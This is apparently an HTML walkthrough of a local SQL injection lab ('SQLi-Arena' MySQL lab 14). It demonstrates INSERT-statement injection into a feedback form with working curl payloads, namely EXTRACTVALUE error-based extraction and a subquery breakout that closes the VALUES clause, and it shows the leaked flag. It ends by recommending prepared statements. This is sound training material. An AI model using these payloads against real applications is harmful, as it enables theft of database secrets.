<h4>Step 1: Submit Normal Feedback</h4>
<p>
    Start by submitting legitimate feedback to understand how the form works.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Submission</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mysql/lab14" \<br>
        &nbsp;&nbsp;--data-urlencode "fb_name=TestUser" --data-urlencode "fb_comment=Great product!" --data-urlencode "fb_rating=5"<br>
        <span class="prompt">Query: </span>INSERT INTO feedback (name, comment, rating) VALUES ('TestUser', 'Great product!', '5')<br>
        <span class="prompt">Result: </span><strong>Thank you for your feedback!</strong> Your submission has been recorded.
    </div>
</div>

<h4>Step 2: Trigger an Error to Reveal Context</h4>
<p>
    Inject a single quote in the name field to break the SQL syntax and reveal the INSERT context.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Break the Query</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mysql/lab14" \<br>
        &nbsp;&nbsp;--data-urlencode "fb_name='" --data-urlencode "fb_comment=test" --data-urlencode "fb_rating=5"<br>
        <span class="prompt">Query: </span>INSERT INTO feedback (name, comment, rating) VALUES (''', 'test', '5')<br>
        <span class="prompt">MySQL Error: </span>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'test', '5')' at line 1<br><br>
        <span class="prompt">Analysis: </span>The error confirms we are inside an INSERT ... VALUES ('...', '...', '...') context.
    </div>
</div>

<h4>Step 3: Error-Based Extraction with EXTRACTVALUE</h4>
<p>
    Use <code>EXTRACTVALUE()</code> inside the INSERT to trigger an XPATH error that leaks the
    admin secret. The trick is to keep the INSERT syntactically valid while causing the error.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Error-Based Extraction</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mysql/lab14" \<br>
        &nbsp;&nbsp;--data-urlencode "fb_name=test' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT admin_secret FROM admin_panel LIMIT 1))) AND '" \<br>
        &nbsp;&nbsp;--data-urlencode "fb_comment=test" --data-urlencode "fb_rating=5"<br>
        <span class="prompt">Query: </span>INSERT INTO feedback (name, comment, rating) VALUES ('test' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT admin_secret FROM admin_panel LIMIT 1))) AND '', 'test', '5')<br><br>
        <span class="prompt">MySQL Error: </span>XPATH syntax error: '~FLAG{1ns3rt_upd4t3_1nj3ct}'<br><br>
        <span class="prompt">Flag: </span><strong>FLAG{1ns3rt_upd4t3_1nj3ct}</strong>
    </div>
</div>

<p>
    The XPATH error reveals the admin secret prefixed with <code>~</code>.
</p>

<h4>Step 4: Alternative. Subquery Injection in VALUES</h4>
<p>
    Instead of error-based, you can break out of the VALUES clause and inject the flag
    directly into a column using a subquery.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. Subquery in VALUES</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mysql/lab14" \<br>
        &nbsp;&nbsp;--data-urlencode "fb_name=test', (SELECT admin_secret FROM admin_panel LIMIT 1), 5) -- -" \<br>
        &nbsp;&nbsp;--data-urlencode "fb_comment=anything" --data-urlencode "fb_rating=5"<br>
        <span class="prompt">Query: </span>INSERT INTO feedback (name, comment, rating) VALUES ('test', (SELECT admin_secret FROM admin_panel LIMIT 1), 5) -- -', 'anything', '5')<br><br>
        <span class="prompt">Result: </span><strong>Thank you for your feedback!</strong> Your submission has been recorded.<br><br>
        <span class="prompt">// Now check the Recent Feedback table (flag appears in comment column):</span><br>
        Name: test<br>
        Comment: <strong>FLAG{1ns3rt_upd4t3_1nj3ct}</strong><br>
        Rating: 5
    </div>
</div>

<p>
    The flag now appears in the comment column of the recent feedback table. This approach
    closes the VALUES clause early, inserts a subquery result as the comment, and comments
    out the rest of the original query.
</p>

<h4>Step 5: Understanding INSERT Injection Anatomy</h4>
<p>
    Let&rsquo;s break down how the subquery injection works:
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. Injection Anatomy</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// Original template:</span><br>
        INSERT INTO feedback (name, comment, rating) VALUES ('<strong>[NAME]</strong>', '<strong>[COMMENT]</strong>', '<strong>[RATING]</strong>')<br><br>
        <span class="prompt">// Injected name value:</span><br>
        test', (SELECT admin_secret FROM admin_panel LIMIT 1), 5) -- -<br><br>
        <span class="prompt">// Resulting SQL:</span><br>
        INSERT INTO feedback (name, comment, rating) VALUES ('<span style="color:#0f0;">test</span>', <span style="color:#f80;">(SELECT admin_secret FROM admin_panel LIMIT 1)</span>, <span style="color:#0f0;">5</span>) <span style="color:#888;">-- -', 'anything', '5')</span><br><br>
        <span class="prompt">Breakdown:</span><br>
        &bull; <span style="color:#0f0;">test</span>: closes the name string<br>
        &bull; <span style="color:#f80;">(SELECT ...)</span> -- subquery becomes the comment value<br>
        &bull; <span style="color:#0f0;">5</span>: provides a valid rating<br>
        &bull; <span style="color:#888;">-- -</span> -- comments out the rest
    </div>
</div>

<h4>Step 6: Submit the Admin Secret</h4>
<p>
    Copy the flag and paste it into the verification form:
    <code>FLAG{1ns3rt_upd4t3_1nj3ct}</code>.
</p>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> SQL injection is not limited to <code>SELECT</code> statements.
    <code>INSERT</code> and <code>UPDATE</code> statements are equally vulnerable when user input
    is concatenated directly. Error-based techniques like <code>EXTRACTVALUE()</code> work in any
    query context, and subquery injection allows data to be exfiltrated by inserting it into
    visible columns. Always use <strong>prepared statements</strong> for all query types --
    including <code>INSERT</code>, <code>UPDATE</code>, and <code>DELETE</code>.
</div>
